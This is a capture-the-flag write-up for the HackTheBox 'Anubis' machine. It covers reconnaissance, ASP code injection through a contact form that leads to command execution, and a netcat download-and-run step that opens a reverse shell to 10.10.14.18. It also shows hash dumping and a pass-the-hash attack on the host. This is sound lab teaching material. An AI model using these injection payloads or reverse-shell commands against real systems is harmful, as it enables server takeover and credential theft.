# HackTheBox-Anubis

## NMAP

```bash
PORT      STATE SERVICE       REASON          VERSION
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
443/tcp   open  ssl/http      syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                               
|_http-title: Not Found                                 
| ssl-cert: Subject: commonName=www.windcorp.htb
| Subject Alternative Name: DNS:www.windcorp.htb                          
| Issuer: commonName=www.windcorp.htb                                     
| Public Key type: rsa                 
| Public Key bits: 2048                                                   
| Signature Algorithm: sha256WithRSAEncryption                            
| Not valid before: 2021-05-24T19:44:56                                   
| Not valid after:  2031-05-24T19:54:56                                           |_  http/1.1                         
445/tcp   open  microsoft-ds? syn-ack ttl 127                             
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49715/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC          
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows                  
Host script results:                 
|_clock-skew: mean: 0s, deviation: 0s, median: 0s                         
| p2p-conficker:                     
|   Checking for Conficker.C or higher...                                 
|   Check 1 (port 29263/tcp): CLEAN (Timeout)                             
|   Check 2 (port 29705/tcp): CLEAN (Timeout)                             
|   Check 3 (port 30756/udp): CLEAN (Timeout)                             
|   Check 4 (port 64422/udp): CLEAN (Timeout)                             
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:                
|   2.02:                            
|_    Message signing enabled and required                                
| smb2-time:                         
|   date: 2021-08-15T05:00:49                                             
|_  start_date: N/A                  
     
```

## PORT 139/445 (SMB)

We can see that smb is running but we can't access any shares as `anonmyous`

<img src="https://i.imgur.com/eXksWle.png"/>

So let's move on to https

## PORT 443 (HTTPS)

If we try to visit https we would get 404 not found , but looking at nmap scan we can see that from the ssl certificate it found a domain name `www.windcorp.htb` so let's add it in our `/etc/hosts` file

<img src="https://i.imgur.com/buM8rNf.png"/>

<img src="https://i.imgur.com/kBjuSF0.png"/>

<img src="https://i.imgur.com/9RzMln2.png"/>

I tried running `gobuster` to fuzz for files and directories but not found nothing interesting

<img src="https://i.imgur.com/qefrsPX.png"/>

So scrolled down and saw a Contact form where we can send message so , I intercepted the request to see if it actually sends a message

<img src="https://i.imgur.com/HqvGAr6.png"/>

<img src="https://i.imgur.com/lpGaxwq.png"/>

It's taking those input fields as GET parameter values in `save.php` and brings us to `preview.php` to ask for confirmation

<img src="https://i.imgur.com/lCRqOfK.png"/>

After that nothing happens, I ran `gobuster` again by specifiying `asp` extensions and saw that there's a file created `Test.asp` with message details that we gave

<img src="https://i.imgur.com/Rcgg2MA.png"/>

<img src="https://i.imgur.com/qcGWVIb.png"/>

We can see it's showing the message details that we inputted in the contact form in asp page (Active Server page) which is framework for building web pages for IIS (windows server), so we can try if we can include asp syntax , a basic syntax to check is 

```asp
<% Response.write("Hello") %>
```

Make sure to url encode it as you submit it through burp suite

<img src="https://i.imgur.com/gwyGrb1.png"/>

And it gets rendered , we can try to supply a wrong syntax

<img src="https://i.imgur.com/oPtRTG3.png"/>

So we defaintely can run any asp syntax or even run a vbs script here , in order to get command execution we can do something like this

https://www.tek-tips.com/viewthread.cfm?qid=180982

```asp
<%

Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd /c ping 10.10.14.18 ", 1, True

%>

```

<img src="https://i.imgur.com/1a39hNX.png"/>

<img src="https://i.imgur.com/Y1DApHo.png"/>

Now we have a command execution and we can simply just upload a netcat executable for windows in `C:\Windows\Temp` and then call that to get a reverse shell


```
<%

Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd /c curl http://10.10.14.18/nc64.exe -o C:\Windows\Temp\nc.exe ", 1, True

%>

```

<img src="https://i.imgur.com/NXcMV3y.png"/>

<img src="https://i.imgur.com/6Ix94FU.png"/>

It made a request for downloading netcat so we now just need to execute it

```
<%

Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd /c C:\Windows\Temp\nc.exe 10.10.14.18 4444 -e cmd.exe ", 1, True

%>

```

<img src="https://i.imgur.com/ZLlDpqZ.png"/>

<img src="https://i.imgur.com/ALP6CKq.png"/>

Even tho we are `authoirty\system` but the hostname is `webserver01` , we can the IP address from which it seems we are in containered environment

<img src="https://i.imgur.com/bbO1X7d.png"/>

We need to break out of this containered environment windows server , so looking at the users we see `containered` user and administrator

<img src="https://i.imgur.com/W1tFHIo.png"/>

But there isn't anything in those directory other than `req.txt` in `Administrator`'s  folder

<img src="https://i.imgur.com/aXgtaN1.png"/>

<img src="https://i.imgur.com/JWsSRqL.png"/>

This looks like a ssl certificate so we can use any online tool to decode it into clear text form

https://certlogik.com/decoder/

<img src="https://i.imgur.com/H9e3Gu7.png"/>

We get a subdomain `softwareportal.windcorp.htb`

172.23.176.172  - ip
172.23.176.1 -dg 
172.23.191.255
1..255 | % {echo "172.23.191.$_"; ping -n 1 -w 100 172.23.191.$_} | Select-String ttl

## Uninteded Way

We could get a meterpreter shell and dump the hashes through it 

<img src="https://i.imgur.com/hMRIgcU.png"/>

On dumping we can see some hashes and this is kinda rare to see that we can do pass the hash attack here with Administrator user by trying the `iisadmin` hash

<img src="https://i.imgur.com/Wk9bOd6.png"/>

We get a `Pwn3d!` which means that we can now get a shell

<img src="https://i.imgur.com/Fxlz5lI.png"/>

Doing `whoami` through this shell

<img src="https://i.imgur.com/4FQ8gTj.png"/>

Or we could use `metasploit` without needing impacket scripits, there's a psexec module in metasploit that we can use to get a shell

<img src="https://i.imgur.com/qEHGx5j.png"/>

<img src="https://i.imgur.com/xXQLoVA.png"/>

<img src="https://i.imgur.com/uy5t0j4.png"/>

To get a fully functional meterpreter shell we need to upload the meterpreter payload and execute it so , upload the payload , start another meterpreter listener

<img src="https://i.imgur.com/RW8FrMI.png"/>

<img src="https://i.imgur.com/kgy0d9T.png"/>
We can dump hashes using `hashdump` and see that the Administrator's hash does match with `iisadmin`

We got root on the actual host machine with uninteded which would get patched so in the end intended is always the way 
